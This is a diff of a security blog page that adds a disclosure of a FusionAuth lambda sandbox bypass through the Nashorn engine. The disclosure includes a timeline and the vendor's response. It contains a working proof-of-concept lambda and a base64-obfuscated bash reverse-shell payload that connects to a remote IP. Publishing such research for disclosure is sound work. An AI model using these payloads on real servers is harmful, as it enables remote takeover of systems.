@@ -6,17 +6,28 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="Shell is Only the Beginning ~">
+    <meta name="description" content="SummaryLambdas sandbox bypass exists in fusionauth, which can lead to remote code execution. FusionAuth is using the Nashorn JavaScript engine to compile and execute lambdas functions. Although fusion">
 <meta property="og:type" content="article">
 <meta property="og:title" content="FusionAuth Remote code execution via Lambdas Sandbox bypass">
 <meta property="og:url" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/index.html">
 <meta property="og:site_name" content="happyhacking-k Blog">
-<meta property="og:description" content="Shell is Only the Beginning ~">
+<meta property="og:description" content="SummaryLambdas sandbox bypass exists in fusionauth, which can lead to remote code execution. FusionAuth is using the Nashorn JavaScript engine to compile and execute lambdas functions. Although fusion">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/1.png">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/2.png">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/3.png">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/4.png">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/5.png">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/6.png">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/7.png">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/8.png">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/9.png">
+<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/10.png">
 <meta property="article:published_time" content="2022-04-08T15:41:33.000Z">
-<meta property="article:modified_time" content="2022-04-08T15:41:33.577Z">
+<meta property="article:modified_time" content="2022-04-10T17:17:48.916Z">
 <meta property="article:author" content="HEXO">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://happyhacking-k.github.io/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/1.png">
     
     
         
@@ -144,7 +155,7 @@
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Product"><span class="toc-number">2.</span> <span class="toc-text">Product</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tested-Version"><span class="toc-number">3.</span> <span class="toc-text">Tested Version</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Details"><span class="toc-number">4.</span> <span class="toc-text">Details</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Principle-of-bypassing-ClassFilter-restrictions%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">Principle of bypassing ClassFilter restrictions：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coordinated-Disclosure-Timeline"><span class="toc-number">5.</span> <span class="toc-text">Coordinated Disclosure Timeline</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Contact"><span class="toc-number">6.</span> <span class="toc-text">Contact</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -184,7 +195,51 @@
   
 
   <div class="content" itemprop="articleBody">
-    
+    <h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>Lambdas sandbox bypass exists in fusionauth, which can lead to remote code execution. FusionAuth is using the Nashorn JavaScript engine to compile and execute lambdas functions. Although fusionauth uses ClassFilter to restrict the execution of arbitrary classes, there is a bypass. Similarly，fusionAuth security team have discussed that this report is not issue with FusionAuth, but rather with Nashorn.</p>
+<h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>FusionAuth</p>
+<h1 id="Tested-Version"><a href="#Tested-Version" class="headerlink" title="Tested Version"></a>Tested Version</h1><p>FusionAuth 1.30.1</p>
+<h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>The business process that triggers the execution of Lambdas script is as follows（take GitHub OpenID for example）：</p>
+<p>Configure Lambdas and identity providers according to the following product documents:<br><a target="_blank" rel="noopener" href="https://fusionauth.io/docs/v1/tech/lambdas/">https://fusionauth.io/docs/v1/tech/lambdas/</a><br><a target="_blank" rel="noopener" href="https://fusionauth.io/docs/v1/tech/identity-providers/openid-connect/github/">https://fusionauth.io/docs/v1/tech/identity-providers/openid-connect/github/</a></p>
+<p>Configure Lambdas script：<br>Enter the edit Lambdas function, and the MENU:<br>Home–&gt;Customizations–&gt;Lambdas–&gt;edit(Default OpenID Connect Reconcile provided by FusionAuth)</p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/1.png"></p>
+<p>Enter the POC, and save.</p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/2.png"></p>
+<p>Configure Identity Providers：<br>Enter the edit Identity Providers function, and the MENU:<br>Home–&gt;Settings–&gt;Identity Providers–&gt;Add OpenID Connect</p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/3.png"></p>
+<p>Configure GitHub openid connect as shown in the figure below, set enable and save.<br>Select the configured Lambdas (Default OpenID Connect Reconcile provided by FusionAuth) with the reconcile lambda parameter.</p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/4.png"></p>
+<p>Logout Fusionauth and log in with GitHub OpenID, trigger POC execution in Lambdas script.</p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/5.png"></p>
+<p>It is found that POC is not executed successfully. Login to view the log：<br><code>java.lang.RuntimeException: java.lang.ClassNotFoundException: java.lang.Runtime.getRuntime</code></p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/6.png"></p>
+<p>Consider the Lambdas function to set security restrictions： The engine is configured to use a ClassFilter in order to Prohibit any explicit call to java code.</p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/7.png"></p>
+<h2 id="Principle-of-bypassing-ClassFilter-restrictions："><a href="#Principle-of-bypassing-ClassFilter-restrictions：" class="headerlink" title="Principle of bypassing ClassFilter restrictions："></a>Principle of bypassing ClassFilter restrictions：</h2><ul>
+<li>The filter above does not expose any Java classes to the Javascript scripts, but the ClassFilter on its own is not sufficient to prevent code execution since Nashorn exposes the underlying engine to the script and it is still possible to execute arbitrary code with it. For example, the script below will start a system process:</li>
+</ul>
+<p><code>this.engine.factory.scriptEngine.eval(&#39;java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/pwned&quot;)&#39;)</code></p>
+<ul>
+<li>Construct the final POC as follows, modify the contents of lambda again, and then save：</li>
+</ul>
+<pre><code>function reconcile() &#123;
+    this.engine.factory.scriptEngine.eval(&#39;java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/pwned&quot;)&#39;); 
+&#125;
+</code></pre>
+<p>Ignore the page error, which has no impact on saving and execution.</p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/8.png"></p>
+<p>Logout Fusionauth and log in with GitHub OpenID, trigger new POC execution in Lambdas script.</p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/9.png"></p>
+<p>Ignore the page error, which has no effect on the execution of Lambdas script.<br>After the login operation, the pwned file is successfully created in the TMP directory. </p>
+<p><img src="/2022/04/08/FusionAuth-Remote-code-execution-via-Lambdas-Sandbox-bypass/10.png"></p>
+<p>Execute the get reverse shell command to obtain operating system permissions.</p>
+<pre><code>function reconcile() &#123;
+    this.engine.factory.scriptEngine.eval(&#39;java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMi80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&#39;); 
+&#125;
+</code></pre>
+<p>The fusionauth security team discussed that it’s not issue with fusionauth, and replied that “Similarly, with Nashorn, it appears that they also are the primary issue because they provide access to the context, which also allows RCE. We are also moving off Nashorn in the next few months and will work to ensure that our new JavaScript engine provides better sandboxing.”</p>
+<h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2021-10-01: Report sent to <a href="mailto:&#115;&#101;&#99;&#x75;&#114;&#x69;&#x74;&#121;&#64;&#x66;&#117;&#115;&#105;&#111;&#110;&#97;&#x75;&#116;&#104;&#46;&#105;&#x6f;">&#115;&#101;&#99;&#x75;&#114;&#x69;&#x74;&#121;&#64;&#x66;&#117;&#115;&#105;&#111;&#110;&#97;&#x75;&#116;&#104;&#46;&#105;&#x6f;</a><br>2022-01-14: Reply from <a href="mailto:&#x73;&#101;&#99;&#x75;&#x72;&#x69;&#116;&#x79;&#64;&#102;&#x75;&#x73;&#x69;&#111;&#x6e;&#97;&#117;&#116;&#104;&#x2e;&#105;&#x6f;">&#x73;&#101;&#99;&#x75;&#x72;&#x69;&#116;&#x79;&#64;&#102;&#x75;&#x73;&#x69;&#111;&#x6e;&#97;&#117;&#116;&#104;&#x2e;&#105;&#x6f;</a> that it’s not issue with FusionAuth, and offer me a $500 bounty.<br>2022-04-08: Request for disclosure details and approval to disclosure</p>
+<h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#104;&#x61;&#112;&#112;&#x79;&#x68;&#97;&#99;&#x6b;&#x69;&#x6e;&#103;&#x40;&#x6f;&#117;&#x74;&#x6c;&#111;&#x6f;&#107;&#x2e;&#105;&#x74;">&#104;&#x61;&#112;&#112;&#x79;&#x68;&#97;&#99;&#x6b;&#x69;&#x6e;&#103;&#x40;&#x6f;&#117;&#x74;&#x6c;&#111;&#x6f;&#107;&#x2e;&#105;&#x74;</a>, please include a reference to my blog in any communication regarding this issue.</p>
+
   </div>
 </article>
 
@@ -212,7 +267,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Product"><span class="toc-number">2.</span> <span class="toc-text">Product</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tested-Version"><span class="toc-number">3.</span> <span class="toc-text">Tested Version</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Details"><span class="toc-number">4.</span> <span class="toc-text">Details</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Principle-of-bypassing-ClassFilter-restrictions%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">Principle of bypassing ClassFilter restrictions：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coordinated-Disclosure-Timeline"><span class="toc-number">5.</span> <span class="toc-text">Coordinated Disclosure Timeline</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Contact"><span class="toc-number">6.</span> <span class="toc-text">Contact</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
